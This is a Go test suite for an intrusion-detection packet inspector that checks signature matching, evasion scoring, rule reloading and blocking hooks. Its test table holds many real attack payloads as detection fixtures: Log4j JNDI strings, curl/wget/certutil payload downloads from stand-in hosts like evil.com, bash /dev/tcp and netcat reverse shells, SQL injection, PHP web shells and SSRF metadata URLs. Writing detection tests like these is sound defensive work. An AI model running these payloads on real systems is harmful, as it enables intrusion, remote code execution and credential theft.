package dpi

import (
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"
)

// TestEveryEmbeddedCategory asserts that all enterprise signature categories in Module 1.2 match deterministically.
func TestEveryEmbeddedCategory(t *testing.T) {
	engine := GetDefaultEngine()

	testCases := []struct {
		name     string
		payload  string
		category RuleCategory
		pattern  string
	}{
		// 1. RCE & Deserialization
		{"Shellshock_01", "() { :;}; /bin/sleep 5", CategoryRCEDeserialization, "() { :;};"},
		{"Shellshock_02", "() { _; } > /dev/null", CategoryRCEDeserialization, "() { _; }"},
		{"Log4j_LDAP", "GET /login?user=${jndi:ldap://evil.com/a} HTTP/1.1", CategoryRCEDeserialization, "${jndi:ldap:"},
		{"Log4j_RMI", "${jndi:rmi://10.0.0.1/obj}", CategoryRCEDeserialization, "${jndi:rmi:"},
		{"Log4j_DNS", "${jndi:dns://exfil.attacker.com}", CategoryRCEDeserialization, "${jndi:dns:"},
		{"Log4j_NIS", "${jndi:nis://target}", CategoryRCEDeserialization, "${jndi:nis:"},
		{"CommonsCollections", "gadget: org.apache.commons.collections.functors.InvokerTransformer", CategoryRCEDeserialization, "org.apache.commons.collections"},
		{"InvokeTransformer", "payload_invoketransformer_exec", CategoryRCEDeserialization, "invoketransformer"},
		{"Ysoserial", "ysoserial.payloads.CommonsCollections1", CategoryRCEDeserialization, "ysoserial"},
		{"Process_Runtime", "java.lang.Runtime.getRuntime().exec('id')", CategoryRCEDeserialization, "getruntime().exec"},
		{"Process_Builder", "new ProcessBuilder('/bin/bash').start()", CategoryRCEDeserialization, "processbuilder"},
		{"ThinkPHP_App", "GET /index.php?s=index/think\\app/invokefunction HTTP/1.1", CategoryRCEDeserialization, "think\\app"},
		{"ThinkPHP_Invoke", "call_user_func_array('invokefunction', ...)", CategoryRCEDeserialization, "invokefunction"},

		// 2. Command Injection & Reverse Shells
		{"Cmd_Sh", "; /bin/sh -c 'whoami'", CategoryCommandInjection, "/bin/sh"},
		{"Cmd_Bash", "| /bin/bash -i", CategoryCommandInjection, "/bin/bash"},
		{"Cmd_PowerShell_Exe", "powershell.exe -ExecutionPolicy Bypass -NoProfile", CategoryCommandInjection, "powershell.exe"},
		{"Cmd_PowerShell_Enc", "powershell -enc SUVYIChOZXctT2JqZWN0", CategoryCommandInjection, "powershell -enc"},
		{"Cmd_Windows_C", "cmd.exe /c dir C:\\", CategoryCommandInjection, "cmd.exe /c"},
		{"Cmd_Curl_Silent", "curl -s http://192.168.1.50/mal.sh | sh", CategoryCommandInjection, "curl -s"},
		{"Cmd_Wget_Http", "wget http://bad.actor/rootkit -O /tmp/k", CategoryCommandInjection, "wget http"},
		{"Cmd_Certutil", "certutil.exe -urlcache -split -f http://evil.com/p.exe", CategoryCommandInjection, "certutil.exe -urlcache"},
		{"Rev_Bash_TCP", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", CategoryCommandInjection, "/dev/tcp/"},
		{"Rev_Netcat_Exec", "nc -e /bin/sh 10.0.0.1 1337", CategoryCommandInjection, "nc -e"},
		{"Rev_Netcat_Listen", "nc -lvnp 4444", CategoryCommandInjection, "nc -lvnp"},
		{"Cmd_Cat_Passwd", "cat /etc/passwd", CategoryCommandInjection, "cat /etc/passwd"},
		{"Cmd_Cat_Shadow", "cat /etc/shadow", CategoryCommandInjection, "cat /etc/shadow"},
		{"Cmd_Whoami", "; whoami ;", CategoryCommandInjection, "whoami"},

		// 3. Advanced SQL Injection (SQLi)
		{"SQLi_Union_Select", "1' union select 1,2,3,4,5--", CategorySQLInjection, "union select"},
		{"SQLi_Union_All_Select", "admin' UNION ALL SELECT username, password FROM users--", CategorySQLInjection, "union all select"},
		{"SQLi_Order_By", "id=1 order by 15", CategorySQLInjection, "order by"},
		{"SQLi_Info_Schema", "select table_name from information_schema.tables", CategorySQLInjection, "information_schema"},
		{"SQLi_Sqlite_Master", "SELECT sql FROM sqlite_master WHERE type='table'", CategorySQLInjection, "sqlite_master"},
		{"SQLi_Waitfor_Delay", "'; waitfor delay '0:0:5'--", CategorySQLInjection, "waitfor delay"},
		{"SQLi_Sleep", "1' AND sleep(5)--", CategorySQLInjection, "sleep("},
		{"SQLi_Benchmark", "1' AND benchmark(10000000,MD5(1))--", CategorySQLInjection, "benchmark("},
		{"SQLi_PG_Sleep", "SELECT pg_sleep(5);", CategorySQLInjection, "pg_sleep"},
		{"SQLi_Or_1_Equals_1", "admin' or 1=1--", CategorySQLInjection, "' or 1=1"},
		{"SQLi_Or_1_Equals_1_Double", "admin\" or 1=1--", CategorySQLInjection, "\" or 1=1"},
		{"SQLi_Or_1_Equals_1_Quoted", "admin' or '1'='1", CategorySQLInjection, "' or '1'='1"},
		{"SQLi_Load_File", "SELECT load_file('/etc/passwd');", CategorySQLInjection, "load_file("},
		{"SQLi_Into_Outfile", "SELECT '<?php system($_GET[\"cmd\"]); ?>' into outfile '/var/www/shell.php'", CategorySQLInjection, "into outfile"},
		{"SQLi_Into_Dumpfile", "SELECT binary_data into dumpfile '/tmp/payload.so'", CategorySQLInjection, "into dumpfile"},

		// 4. Path Traversal & File Inclusion (LFI/RFI)
		{"LFI_Dot_Dot_Slash", "GET /download?file=../../../../etc/shadow HTTP/1.1", CategoryPathTraversal, "../../"},
		{"LFI_Dot_Dot_Backslash", "..\\..\\windows\\win.ini", CategoryPathTraversal, "..\\..\\"},
		{"LFI_Url_Encoded_Slash", "page=..%2f..%2fetc%2fpasswd", CategoryPathTraversal, "..%2f..%2f"},
		{"LFI_Url_Encoded_Backslash", "page=..%5c..%5cboot.ini", CategoryPathTraversal, "..%5c..%5c"},
		{"LFI_Etc_Passwd", "GET /etc/passwd HTTP/1.1", CategoryPathTraversal, "/etc/passwd"},
		{"LFI_Etc_Shadow", "/etc/shadow", CategoryPathTraversal, "/etc/shadow"},
		{"LFI_Etc_Hosts", "/etc/hosts", CategoryPathTraversal, "/etc/hosts"},
		{"LFI_Win_Boot", "type c:\\boot.ini", CategoryPathTraversal, "c:\\boot.ini"},
		{"LFI_Win_Win_Ini", "c:\\windows\\win.ini", CategoryPathTraversal, "c:\\windows\\win.ini"},
		{"LFI_Win_System32", "c:\\windows\\system32\\cmd.exe", CategoryPathTraversal, "c:\\windows\\system32"},
		{"LFI_PHP_Filter", "php://filter/convert.base64-encode/resource=index.php", CategoryPathTraversal, "php://filter"},
		{"LFI_PHP_Input", "php://input", CategoryPathTraversal, "php://input"},
		{"LFI_Data_Plain", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=", CategoryPathTraversal, "data://text/plain"},

		// 5. Web Shells & Backdoors
		{"WS_Eval_Base64", "<?php eval(base64_decode($_POST['x'])); ?>", CategoryWebShell, "eval(base64_decode"},
		{"WS_Eval_Post", "eval($_post['cmd']);", CategoryWebShell, "eval($_post"},
		{"WS_Eval_Get", "eval($_get['c']);", CategoryWebShell, "eval($_get"},
		{"WS_Assert_Post", "assert($_post['pass']);", CategoryWebShell, "assert($_post"},
		{"WS_Shell_Exec", "shell_exec($_GET['cmd'])", CategoryWebShell, "shell_exec("},
		{"WS_Passthru", "passthru('cat /etc/passwd')", CategoryWebShell, "passthru("},
		{"WS_Popen", "popen('/bin/bash', 'r')", CategoryWebShell, "popen("},
		{"WS_Jsp_Page_Import", "<%@ page import=\"java.io.*\" %>", CategoryWebShell, "<%@ page import"},
		{"WS_Jsp_Root", "<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" version=\"1.2\">", CategoryWebShell, "jsp:root"},

		// 6. SSRF & Cloud Metadata Exploits
		{"SSRF_AWS_Metadata", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", CategorySSRFMetadata, "169.254.169.254"},
		{"SSRF_GCP_Metadata", "http://metadata.google.internal/computeMetadata/v1/", CategorySSRFMetadata, "metadata.google.internal"},
		{"SSRF_File_URI", "file:///etc/passwd", CategorySSRFMetadata, "file:///"},
		{"SSRF_Gopher_URI", "gopher://127.0.0.1:6379/_flushall", CategorySSRFMetadata, "gopher://"},
		{"SSRF_Dict_URI", "dict://127.0.0.1:11211/stat", CategorySSRFMetadata, "dict://"},

		// 7. XSS & Template Injection (SSTI)
		{"XSS_Script", "<script>alert(1)</script>", CategoryXSSSSTI, "<script"},
		{"XSS_Javascript", "<a href=\"javascript:alert(document.cookie)\">click</a>", CategoryXSSSSTI, "javascript:"},
		{"XSS_Doc_Cookie", "document.cookie=\"session=stolen\"", CategoryXSSSSTI, "document.cookie"},
		{"XSS_Onerror", "<img src=x onerror=alert(1)>", CategoryXSSSSTI, "onerror="},
		{"XSS_Onload", "<body onload=alert('XSS')>", CategoryXSSSSTI, "onload="},
		{"SSTI_Config_Items", "{{config.items()}}", CategoryXSSSSTI, "{{config.items()}}"},
		{"SSTI_Jinja_Math", "{{7*7}}", CategoryXSSSSTI, "{{7*7}}"},
		{"SSTI_Ruby_Math", "#{7*7}", CategoryXSSSSTI, "#{7*7}"},
		{"SSTI_Java_EL_Math", "${7*7}", CategoryXSSSSTI, "${7*7}"},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			match, ok := engine.Scan([]byte(tc.payload))
			if !ok {
				t.Fatalf("Expected pattern %q to match payload %q, but got no match", tc.pattern, tc.payload)
			}
			if match.Category != tc.category {
				t.Errorf("Expected category %s, got %s", tc.category, match.Category)
			}
			if match.MatchedPattern != tc.pattern {
				t.Errorf("Expected pattern %s, got %s", tc.pattern, match.MatchedPattern)
			}
		})
	}
}

// TestObfuscatedEvasionAttempts tests URL-encoded and SQL inline comment evasion attempts.
func TestObfuscatedEvasionAttempts(t *testing.T) {
	inspector := GetDefaultInspector()

	t.Run("URLEncoded_PathTraversal", func(t *testing.T) {
		// %2e%2e%2f is URL-encoded ../
		payload := []byte("%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f")
		res := inspector.InspectPacket(payload)

		if res.Verdict == VerdictClean {
			t.Fatalf("Expected evasion attempt %s to be dropped or tarpitted, got Clean (score: %.2f)",
				string(payload), res.Score)
		}
		if res.Score < 0.60 {
			t.Errorf("Expected anomaly score >= 0.60 for URL-encoded traversal evasion, got %.2f", res.Score)
		}
	})

	t.Run("SQL_InlineComments_Evasion", func(t *testing.T) {
		// Inline comments used to evade deterministic space-delimited signatures
		payload := []byte("admin'/**/or/**/1=1;--")
		res := inspector.InspectPacket(payload)

		if res.Verdict == VerdictClean {
			t.Fatalf("Expected SQL inline comment evasion %s to trigger tarpit or drop, got Clean (score: %.2f)",
				string(payload), res.Score)
		}
		if res.Score < 0.60 {
			t.Errorf("Expected anomaly score >= 0.60 for SQL comment obfuscation, got %.2f", res.Score)
		}
	})

	t.Run("SQL_InlineComments_UnionSelect", func(t *testing.T) {
		payload := []byte("1'/**/UNION/**/SELECT/**/1,2,3;--")
		res := inspector.InspectPacket(payload)

		if res.Verdict == VerdictClean {
			t.Fatalf("Expected SQL inline comment union select evasion to trigger, got Clean (score: %.2f)", res.Score)
		}
		if res.Score < 0.60 {
			t.Errorf("Expected score >= 0.60, got %.2f", res.Score)
		}
	})
}

// TestSafeTrafficBaseline verifies that valid JSON API calls and clean HTML pass with Score < 0.40.
func TestSafeTrafficBaseline(t *testing.T) {
	inspector := GetDefaultInspector()

	safeCases := []struct {
		name    string
		payload string
	}{
		{
			name:    "Valid_JSON_API_Call_1",
			payload: `{"user_id": 12345, "action": "get_profile", "status": "active"}`,
		},
		{
			name:    "Valid_JSON_API_Call_2",
			payload: `{"status": "success", "data": {"items": [1, 2, 3], "total": 3}}`,
		},
		{
			name:    "Clean_HTML_Page",
			payload: `<html><head><title>Dashboard</title></head><body><h1>Welcome to Portal</h1><p>Normal corporate page.</p></body></html>`,
		},
		{
			name:    "Standard_HTTP_GET",
			payload: "GET /api/v1/health HTTP/1.1\r\nHost: api.corporate.local\r\nAccept: application/json\r\n\r\n",
		},
		{
			name:    "Short_Handshake_Packet",
			payload: "ACK\r\n",
		},
	}

	for _, tc := range safeCases {
		t.Run(tc.name, func(t *testing.T) {
			res := inspector.InspectPacket([]byte(tc.payload))

			if res.Verdict != VerdictClean {
				t.Errorf("[%s] Expected VerdictClean, got %s (Reason: %s, Score: %.2f)",
					tc.name, res.Verdict, res.Reason, res.Score)
			}
			if res.Score >= 0.40 {
				t.Errorf("[%s] Expected Score < 0.40 for safe traffic baseline, got %.3f",
					tc.name, res.Score)
			}
		})
	}
}

// TestDynamicYAMLHotReload verifies runtime YAML parsing and atomic state machine reload under concurrent load.
func TestDynamicYAMLHotReload(t *testing.T) {
	yamlContent := []byte(`
# Test Custom Rules YAML
rules:
  - pattern: "custom-zero-day-exploit-vector"
    name: "CUSTOM_ZERO_DAY_RULE"
    category: "RCE_DESERIALIZATION"
    severity: "CRITICAL"
  - pattern: "proprietary-exfil-token"
    name: "CUSTOM_DATA_EXFIL"
    category: "SSRF_METADATA"
`)

	engine := NewAhoCorasickEngine(GetEmbeddedSignatures())

	// Verify custom pattern does not match initially
	testPayload := []byte("GET /search?q=custom-zero-day-exploit-vector HTTP/1.1")
	if _, ok := engine.Scan(testPayload); ok {
		t.Fatal("Pattern should not match before reload")
	}

	// Concurrently scan while triggering atomic reload
	var wg sync.WaitGroup
	var scanErrors atomic.Uint64
	done := make(chan struct{})

	// Spawn readers
	for i := 0; i < 4; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			benign := []byte(`{"user":"alice","status":"online"}`)
			for {
				select {
				case <-done:
					return
				default:
					_, _ = engine.Scan(benign)
				}
			}
		}()
	}

	// Trigger reload
	err := engine.ReloadFromYAML(yamlContent)
	if err != nil {
		t.Fatalf("Failed to reload from YAML: %v", err)
	}

	close(done)
	wg.Wait()

	if scanErrors.Load() > 0 {
		t.Fatalf("Encountered %d errors during concurrent atomic reload", scanErrors.Load())
	}

	// Verify newly loaded custom rule matches
	match, ok := engine.Scan(testPayload)
	if !ok {
		t.Fatal("Expected custom pattern to match after YAML reload")
	}
	if match.RuleName != "CUSTOM_ZERO_DAY_RULE" {
		t.Errorf("Expected rule name CUSTOM_ZERO_DAY_RULE, got %s", match.RuleName)
	}
	if match.Category != CategoryRCEDeserialization {
		t.Errorf("Expected category RCE_DESERIALIZATION, got %s", match.Category)
	}

	// Also verify baseline rule still works
	baseMatch, baseOk := engine.Scan([]byte("/bin/bash -i"))
	if !baseOk || baseMatch.RuleName != "Direct Unix Shell Execution /bin/bash" {
		t.Errorf("Baseline rules missing after reload: ok=%v, match=%+v", baseOk, baseMatch)
	}
}

// TestAutonomousReactionHooking verifies that drop and tarpit triggers invoke respective defenses.
func TestAutonomousReactionHooking(t *testing.T) {
	tempDir, err := os.MkdirTemp("", "copsec_dpi_test_*")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tempDir)

	cfg := DefaultInspectorConfig()
	cfg.ForensicsDir = tempDir
	inspector := NewDPIInspector(cfg)

	var alertReceived atomic.Bool
	var tarpitReceived atomic.Bool

	inspector.SetAlertHook(func(res InspectionResult) {
		alertReceived.Store(true)
	})
	inspector.SetTarpitHook(func(srcIP string, port int) error {
		tarpitReceived.Store(true)
		return nil
	})

	// 1. Trigger Drop (Deterministic MPM)
	dropPayload := []byte("POST /upload HTTP/1.1\r\n\r\n<?php eval(base64_decode($_POST['c'])); ?>")
	resDrop := inspector.InspectPacketWithIP(dropPayload, "198.51.100.22")

	if resDrop.Verdict != VerdictDrop {
		t.Fatalf("Expected VerdictDrop, got %s", resDrop.Verdict)
	}
	if resDrop.Stage != "DETERMINISTIC_MPM" {
		t.Errorf("Expected stage DETERMINISTIC_MPM, got %s", resDrop.Stage)
	}

	// Verify eBPF ban map updated
	if !inspector.xdpEngine.IsBanned("198.51.100.22") {
		t.Error("Expected source IP 198.51.100.22 to be banned in eBPF xdp_drop_map")
	}

	// Allow async goroutines to settle
	time.Sleep(100 * time.Millisecond)

	if !alertReceived.Load() {
		t.Error("Expected alert hook to be triggered on VerdictDrop")
	}

	// Check if forensic PCAP file was created
	files, err := os.ReadDir(tempDir)
	if err != nil || len(files) == 0 {
		t.Errorf("Expected forensic PCAP file in %s, found %d files (err: %v)", tempDir, len(files), err)
	} else {
		matched := false
		for _, f := range files {
			if strings.HasPrefix(f.Name(), "incident_198.51.100.22_") && strings.HasSuffix(f.Name(), ".pcap") {
				matched = true
				break
			}
		}
		if !matched {
			t.Errorf("Forensic PCAP filename format incorrect: %v", files[0].Name())
		}
	}

	// 2. Trigger Tarpit (Probabilistic ML)
	tarpitPayload := []byte("admin'/**/or/**/1=1;--")
	resTarpit := inspector.InspectPacketWithIP(tarpitPayload, "198.51.100.33")

	if resTarpit.Verdict != VerdictTarpit {
		t.Fatalf("Expected VerdictTarpit, got %s (Score: %.2f)", resTarpit.Verdict, resTarpit.Score)
	}

	time.Sleep(50 * time.Millisecond)
	if !tarpitReceived.Load() {
		t.Error("Expected tarpit redirect hook to be triggered on VerdictTarpit")
	}
}

// -------------------------------------------------------------------------------------------------
// Go Benchmarks: Assert throughput > 500,000 packets/second per core with minimal heap allocations.
// 500,000 packets/sec = max 2,000 ns per packet.
// -------------------------------------------------------------------------------------------------

func BenchmarkAhoCorasickScan(b *testing.B) {
	engine := GetDefaultEngine()
	// Representative 256-byte HTTP request payload
	payload := []byte("GET /api/v1/users/list?page=1&limit=50&sort=asc HTTP/1.1\r\n" +
		"Host: corporate.internal.local\r\n" +
		"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\r\n" +
		"Accept: application/json, text/plain, */*\r\n" +
		"Connection: keep-alive\r\n" +
		"Authorization: Bearer token_987654321_secure_session\r\n\r\n")

	b.ReportAllocs()
	b.ResetTimer()

	for i := 0; i < b.N; i++ {
		_, _ = engine.Scan(payload)
	}
}

func BenchmarkFeatureExtraction(b *testing.B) {
	payload := []byte("POST /search?query=SELECT%20*%20FROM%20products%20WHERE%20id=10 HTTP/1.1\r\n" +
		"Host: shop.corporate.com\r\n" +
		"Content-Type: application/x-www-form-urlencoded\r\n" +
		"Content-Length: 64\r\n\r\n" +
		"filter=status%3Dactive%26category%3Delectronics%26price%3D100")

	b.ReportAllocs()
	b.ResetTimer()

	for i := 0; i < b.N; i++ {
		_ = ExtractFeatures(payload)
	}
}

func BenchmarkFullInspect(b *testing.B) {
	inspector := GetDefaultInspector()
	payload := []byte(`{"user_id": 12345, "action": "update_preferences", "theme": "dark", "locale": "en-US"}`)

	b.ReportAllocs()
	b.ResetTimer()

	for i := 0; i < b.N; i++ {
		_ = inspector.InspectPacket(payload)
	}
}
